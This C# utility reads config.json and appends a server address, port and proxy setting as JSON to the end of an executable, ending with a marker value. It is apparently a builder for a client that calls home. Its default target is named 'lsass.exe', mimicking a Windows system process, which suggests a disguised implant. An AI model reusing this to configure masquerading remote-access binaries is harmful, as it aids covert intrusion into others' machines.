using System;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Text;

namespace addconfig
{
    class Program
    {
        public const string ConfigFileName = "config.json";

        static void Main(string[] args)
        {
            //try
            {
                if (!File.Exists(ConfigFileName))
                {
                    Console.WriteLine($"{ConfigFileName} not found!");
                    File.WriteAllText(ConfigFileName, SerializeObject(new LocalSettings()));
                    return;
                }

                LocalSettings settings = DeserializeObject<LocalSettings>(File.ReadAllText(ConfigFileName));
                settings.ServerIpAndPort = string.IsNullOrWhiteSpace(settings.ServerIpAndPort) ? $"{GetPublicIP()}:5000" : settings.ServerIpAndPort;
                settings.ExecutableFileName = string.IsNullOrWhiteSpace(settings.ExecutableFileName) || !File.Exists(settings.ExecutableFileName) ? "lsass.exe" : settings.ExecutableFileName;

                string dataSerailized = SerializeObject(new Settings { Proxy = settings.Proxy, ServerIpAndPort = settings.ServerIpAndPort });
                byte[] dataBytes = ASCIIEncoding.Unicode.GetBytes(dataSerailized);

                var fileStream = new FileStream(settings.ExecutableFileName, FileMode.Open, FileAccess.ReadWrite);
                var reader = new BinaryReader(fileStream);
                var writer = new BinaryWriter(fileStream);

                fileStream.Seek(-sizeof(Int16), SeekOrigin.End);
                if (reader.ReadInt16() == 42)
                {
                    fileStream.Seek(-(sizeof(Int16) + sizeof(Int16)), SeekOrigin.End);
                    var size = reader.ReadInt16();
                    fileStream.Seek(-(sizeof(Int16) + sizeof(Int16)+ size), SeekOrigin.End);
                }

                writer.Write(dataBytes, 0, dataBytes.Length);
                writer.Write((Int16)dataBytes.Length);
                writer.Write((Int16)42);
                fileStream.SetLength(fileStream.Position);
                fileStream.Flush();
                fileStream.Close();
            }
            //catch (Exception e)
            //{
            //    Console.WriteLine($"Got exception {e.Message}\r\n{e.StackTrace}");
            //}
        }

        private static string SerializeObject<T>(T p, Type type=null)
        {
            MemoryStream stream1 = new MemoryStream();
            DataContractJsonSerializer ser = new DataContractJsonSerializer(type ?? typeof(T));
            ser.WriteObject(stream1, p);
            stream1.Position = 0;
            StreamReader sr = new StreamReader(stream1);
            return sr.ReadToEnd();
        }

        private static T DeserializeObject<T>(string val)
        {
            MemoryStream stream1 = new MemoryStream(Encoding.Unicode.GetBytes(val));            
            stream1.Position = 0;
            DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(T));
            return (T)ser.ReadObject(stream1);           
        }
        

        public static string GetPublicIP()
        {
            string url = "http://checkip.dyndns.org";
            System.Net.WebRequest req = System.Net.WebRequest.Create(url);
            System.Net.WebResponse resp = req.GetResponse();
            System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
            string response = sr.ReadToEnd().Trim();
            string[] a = response.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string a4 = a3[0];
            return a4;
        }
    }

    [DataContract]
    public class Settings
    {
        [DataMember]
        public string ServerIpAndPort { get; set; }
        [DataMember]
        public string Proxy { get; set; }
    }

    [DataContract]
    public class LocalSettings : Settings
    {
        [DataMember]
        public string ExecutableFileName { get; set; }
    }
}
